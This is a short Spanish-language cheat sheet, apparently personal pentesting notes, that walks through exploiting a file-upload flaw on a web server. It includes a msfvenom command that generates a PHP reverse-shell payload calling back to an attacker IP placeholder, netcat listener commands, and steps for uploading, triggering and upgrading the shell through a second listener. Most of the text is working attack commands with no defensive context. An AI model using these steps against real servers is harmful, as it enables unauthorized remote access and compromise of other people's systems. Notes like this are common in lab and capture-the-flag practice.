# 1.Encontrar un lugar que permita subir archivos
# 2.Encontrar la ruta en la que se suben los archivos

# 3.Crear un Payload para subir

```bash
msfvenom -p php/reverse_php LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f raw > pwned.php
```

# 4.Subir el Payload

# 5.Poner la máquina a la escucha
## Netcat
```bash
nc -nlvp <"Puerto que hemos especificado en el payload">
```

# 6.Abrir en el navegador la ruta en la que se suben los archivo y abrir el Payload

# 7. Poner la máquina atacante a la escucha en otro puerto distinto

## Netcat
```bash
nc -nlvp <"Puerto a la escucha, distinto al del payload">
```

# 8.Enviar una reverse shell al nuevo puerto
Utilizando: https://www.revshells.com/